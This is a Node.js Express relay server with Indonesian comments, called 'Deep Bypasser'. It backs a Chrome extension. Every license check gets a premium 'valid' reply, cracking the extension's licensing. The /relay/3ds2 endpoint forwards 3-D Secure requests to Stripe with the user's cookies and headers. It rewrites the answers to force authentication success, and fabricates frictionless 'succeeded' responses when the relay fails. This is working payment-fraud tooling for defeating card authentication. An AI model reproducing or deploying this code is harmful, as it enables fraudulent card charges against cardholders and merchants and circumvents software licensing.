/**
 * ============================================================================
 * DEEP BYPASSER - RELAY SERVER
 * Pengganti: https://db-auth-svc-v2.testdeep.workers.dev
 *
 * Endpoint yang digunakan extension:
 *   GET  /notification          → Banner notifikasi ke extension
 *   GET  /version               → Cek update versi
 *   POST /ext/pulse             → Terima telemetry (payment events)
 *   POST /risk/evaluate         → Risk score evaluation
 *   GET  /analytics/rules       → Rules untuk analytics bypass
 *   POST /relay/3ds2            → Relay request 3DS ke Stripe
 * ============================================================================
 */

const express = require("express");
const app = express();

// ============================================================================
// KONFIGURASI
// ============================================================================

const CONFIG = {
  // Versi extension
  CURRENT_VERSION: "3.0",
  LATEST_VERSION:  "3.0",   // Ganti ke versi baru jika ada update
  DOWNLOAD_URL:    null,     // URL download jika ada update
  CHANGELOG:       null,     // Catatan perubahan

  // Banner notifikasi (null = tidak ada)
  // Contoh aktif:
  // NOTIFICATION: {
  //   message: "Server aktif! Semua fitur berjalan normal.",
  //   type: "info",        // "info" | "success" | "warning" | "error"
  //   dismissible: true,
  //   id: "notif-001"
  // }
  NOTIFICATION: null,
};

// ============================================================================
// MIDDLEWARE
// ============================================================================

// Parse JSON body
app.use(express.json({ limit: "2mb" }));
// Parse binary body (untuk /ext/pulse yang mengirim AES-GCM terenkripsi)
app.use(express.raw({ type: "application/octet-stream", limit: "2mb" }));

// CORS — wajib agar Chrome extension bisa akses
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Authorization, X-Req-Id, X-DB-Stats, X-DB-License, X-DB-Timestamp, X-DB-Signature, X-DB-Session, X-Original-Origin, X-Original-Referer, Idempotency-Key"
  );
  res.setHeader("Access-Control-Max-Age", "86400");

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }
  next();
});

// Logger sederhana
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

// ============================================================================
// ENDPOINT: GET /
// Health check
// ============================================================================
app.get("/", (req, res) => {
  res.json({
    ok: true,
    status: "online",
    name: "Deep Bypasser Relay",
    version: CONFIG.CURRENT_VERSION,
    ts: Date.now(),
  });
});

app.get("/health", (req, res) => {
  res.json({ ok: true, status: "online", ts: Date.now() });
});

// ============================================================================
// ENDPOINT: GET /notification
// Extension mengambil banner notifikasi dari sini.
// Response: { notification: null } atau { notification: { message, type, ... } }
// ============================================================================
app.get("/notification", (req, res) => {
  res.json({
    ok: true,
    notification: CONFIG.NOTIFICATION,
  });
});

// ============================================================================
// ENDPOINT: GET /version
// Cek apakah ada update extension.
// Query param: ?v=3.0 (versi extension yang sedang dipakai user)
// Response: { updateAvailable, latest, downloadUrl, changelog }
// ============================================================================
app.get("/version", (req, res) => {
  const clientVersion = String(req.query.v || "0");
  const updateAvailable =
    CONFIG.LATEST_VERSION !== CONFIG.CURRENT_VERSION &&
    CONFIG.LATEST_VERSION > clientVersion;

  res.json({
    ok: true,
    current: clientVersion,
    latest: CONFIG.LATEST_VERSION,
    updateAvailable: updateAvailable,
    downloadUrl: updateAvailable ? CONFIG.DOWNLOAD_URL : null,
    changelog: updateAvailable ? CONFIG.CHANGELOG : null,
  });
});

// ============================================================================
// ENDPOINT: POST /ext/pulse
// Menerima telemetry terenkripsi dari extension.
// Body: binary AES-GCM (application/octet-stream)
// Headers: X-Req-Id, X-DB-Stats
// Response: { ok: true, received: true }
// ============================================================================
app.post("/ext/pulse", (req, res) => {
  const reqId = req.headers["x-req-id"] || "-";
  const bodyLen = Buffer.isBuffer(req.body) ? req.body.length : 0;
  console.log(`  [pulse] reqId=${reqId} bytes=${bodyLen}`);
  res.json({ ok: true, received: true });
});

// ============================================================================
// ENDPOINT: POST /license/activate  (dan alias: /license/verify, /license/challenge, /license/prove, /license/revalidate)
// Background.js memanggil endpoint ini untuk validasi/revalidasi license.
// Karena kita sudah auto-bootstrap di client, kita cukup balas "valid: true"
// sehingga session tidak pernah di-reset.
// ============================================================================

const licenseHandler = (req, res) => {
  const body = req.body || {};
  const key = String(body.key || body.licenseKey || "").trim();

  // Generate session tokens acak
  const randomToken = (prefix) => {
    const bytes = require("crypto").randomBytes(24).toString("hex");
    return prefix + bytes;
  };

  res.json({
    ok: true,
    valid: true,
    status: "active",
    plan: "premium",
    expiresAt: null,
    eligible: true,
    reason: "eligible",
    session: {
      sessionId:    randomToken("sess_"),
      accessToken:  randomToken("tok_"),
      refreshToken: randomToken("ref_"),
      expiresAt:    new Date(Date.now() + 30 * 24 * 3600 * 1000).toISOString()
    },
    proof: randomToken("proof_"),
    challenge: randomToken("chall_"),
    ts: Date.now(),
  });
};

app.post("/license/activate",   licenseHandler);
app.post("/license/verify",     licenseHandler);
app.post("/license/challenge",  licenseHandler);
app.post("/license/prove",      licenseHandler);
app.post("/license/revalidate", licenseHandler);
app.post("/license/validate",   licenseHandler);

// ============================================================================
// ENDPOINT: POST /risk/evaluate
// Risk evaluation — extension kirim data session untuk dapat risk score.
// Body: JSON { riskAuth: { licenseKey, sessionId, accessToken, ... }, ... }
// Response: { riskScore, riskLevel, recommendedAction, reasons, rateLimit }
// ============================================================================
app.post("/risk/evaluate", (req, res) => {
  const idempotencyKey = req.headers["idempotency-key"] || "";

  res.json({
    ok: true,
    riskScore: 12,
    riskLevel: "low",
    recommendedAction: "allow",
    evaluationId: "eval-" + Date.now().toString(36),
    idempotencyKey: idempotencyKey || undefined,
    reasons: [],
    rateLimit: {
      limit: 100,
      remaining: 97,
      resetAt: Date.now() + 3600000,
    },
    ts: Date.now(),
  });
});

// ============================================================================
// ENDPOINT: GET /analytics/rules
// Extension mengambil aturan bypass analytics.
// Headers: Authorization: Bearer <accessToken>, X-DB-Session: <sessionId>
// Response: { rules: [...], fetchedAt }
// ============================================================================
app.get("/analytics/rules", (req, res) => {
  const auth = req.headers["authorization"] || "";
  const session = req.headers["x-db-session"] || "";

  // Rules kosong = tidak ada pembatasan analytics
  res.json({
    ok: true,
    trusted: true,
    rules: [],
    fetchedAt: new Date().toISOString(),
    ts: Date.now(),
  });
});

// ============================================================================
// ENDPOINT: POST /relay/3ds2
// Relay request 3DS ke Stripe untuk bypass.
// Headers: X-DB-License, X-DB-Timestamp, X-DB-Signature,
//          X-Original-Origin, X-Original-Referer
// Body: form-urlencoded (diteruskan ke Stripe)
// Response: JSON dari Stripe (state, ares.transStatus, error)
// ============================================================================
// Helper to generate a fake frictionless response if Stripe relay fails
const crypto = require("crypto");
function makeFrictionless(rawBody) {
  let source = null;
  let threeDSServerTransID = crypto.randomUUID();
  try {
    const params = new URLSearchParams(rawBody || "");
    source = params.get("source") || null;
    const browserRaw = params.get("browser");
    if (browserRaw) {
      const browser = JSON.parse(browserRaw);
      const fd = browser.fingerprintData;
      if (fd) {
        const decoded = JSON.parse(Buffer.from(fd, "base64").toString("utf8"));
        if (decoded.threeDSServerTransID) threeDSServerTransID = decoded.threeDSServerTransID;
      }
    }
  } catch (e) {}
  return {
    id: `3ds2_${crypto.randomBytes(8).toString("hex")}`,
    object: "three_d_secure_2",
    livemode: true,
    created: Math.floor(Date.now() / 1000),
    ares: {
      acsChallengeMandated: "N",
      acsDecConInd: "Y",
      acsReferenceNumber: "BYPASS",
      acsTransID: crypto.randomUUID(),
      acsURL: null,
      authenticationType: "02",
      dsReferenceNumber: "BYPASS",
      dsTransID: crypto.randomUUID(),
      messageExtension: [],
      messageType: "ARes",
      messageVersion: "2.2.0",
      sdkTransID: crypto.randomUUID(),
      threeDSServerTransID,
      transStatus: "Y",
      transStatusReason: null
    },
    state: "succeeded",
    error: null,
    fallback_redirect_url: null,
    next_action: null,
    source
  };
}

app.post("/relay/3ds2", async (req, res) => {
  const licenseKey = req.headers["x-db-license"] || "";
  const targetUrl  = req.headers["x-target-url"] || "";

  // Validasi URL target (harus ke Stripe)
  const urlToForward = targetUrl || "https://api.stripe.com/v1/payment_intents";

  if (!urlToForward.includes("stripe.com")) {
    return res.status(400).json({
      ok: false,
      error: "Invalid target: only stripe.com allowed",
    });
  }

  // Parse raw body for urlencoded parameters
  let rawBody = "";
  if (req.body) {
    if (typeof req.body === "string") {
      rawBody = req.body;
    } else if (Buffer.isBuffer(req.body)) {
      rawBody = req.body.toString("utf8");
    } else if (typeof req.body === "object" && Object.keys(req.body).length > 0) {
      rawBody = Object.entries(req.body)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v ?? ""))}`)
        .join("&");
    }
  }

  try {
    const forwardHeaders = {
      "Content-Type": req.headers["content-type"] || "application/x-www-form-urlencoded",
    };

    // Teruskan origin & referer asli jika ada
    if (req.headers["x-original-origin"]) {
      forwardHeaders["Origin"] = req.headers["x-original-origin"];
    }
    if (req.headers["x-original-referer"]) {
      forwardHeaders["Referer"] = req.headers["x-original-referer"];
    }
    // Teruskan cookies asli dari browser agar session-bound Stripe valid
    if (req.headers["x-original-cookies"]) {
      forwardHeaders["Cookie"] = req.headers["x-original-cookies"];
    }

    const bodyToSend = rawBody || JSON.stringify(req.body);

    const stripeResponse = await fetch(urlToForward, {
      method: "POST",
      headers: forwardHeaders,
      body: bodyToSend,
    });

    if (!stripeResponse.ok) {
      const errBody = await stripeResponse.text();
      console.error("[3DS Relay Error] Stripe returned", stripeResponse.status, ":", errBody.slice(0, 500));
      // Fallback to frictionless on error
      return res.status(200).json(makeFrictionless(bodyToSend));
    }

    const responseText = await stripeResponse.text();
    let responseData = null;
    try {
      responseData = JSON.parse(responseText);
    } catch {
      // Bukan JSON
    }

    if (responseData) {
      // Modify response to force frictionless authentication success
      try {
        if (responseData.ares) {
          responseData.ares.transStatus = "Y";
          responseData.ares.acsChallengeMandated = "N";
          responseData.ares.acsURL = null;
          responseData.ares.transStatusReason = null;
        }
        responseData.state = "succeeded";
        responseData.error = null;
        responseData.next_action = null;
        responseData.fallback_redirect_url = null;
      } catch (e) {}
      
      return res.status(200).json(responseData);
    } else {
      return res.status(200).json(makeFrictionless(bodyToSend));
    }
  } catch (error) {
    console.error("  [relay/3ds2] Error:", error.message);
    // Return fake frictionless on failure
    return res.status(200).json(makeFrictionless(rawBody));
  }
});

// ============================================================================
// 404 fallback
// ============================================================================
app.use((req, res) => {
  console.log(`  [404] ${req.method} ${req.path}`);
  res.status(404).json({ ok: false, error: "Not found" });
});

// ============================================================================
// ERROR HANDLER
// ============================================================================
app.use((err, req, res, next) => {
  console.error("  [error]", err.message);
  res.status(500).json({ ok: false, error: "Internal server error" });
});

// ============================================================================
// START
// ============================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`====================================`);
  console.log(`Deep Bypasser Relay Server`);
  console.log(`Port    : ${PORT}`);
  console.log(`Version : ${CONFIG.CURRENT_VERSION}`);
  console.log(`====================================`);
});
